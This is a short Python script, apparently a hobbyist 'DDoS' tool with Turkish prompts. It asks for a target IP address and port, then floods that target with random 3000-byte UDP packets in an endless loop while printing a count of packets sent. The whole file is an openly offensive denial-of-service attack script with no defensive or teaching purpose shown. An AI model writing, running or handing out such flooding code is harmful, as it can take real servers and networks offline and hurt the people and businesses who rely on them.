import socket
import random
import os

os.system("clear")
kwejnbestoff="""
######################################
#KwejN DDoS V1.0                     #
#Coded By KwejN                      #
######################################

"""
print(kwejnbestoff)

hedef_ip=input("IP GIRINIZ: ")
hedef_port=input("PORT GIRINIZ: ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
    sock.sendto(bytes,(hedef_ip,hedef_port))
    sayac=sayac+1
    print("saldiri baslatildi gonderilen paket:%s"%(sayac))
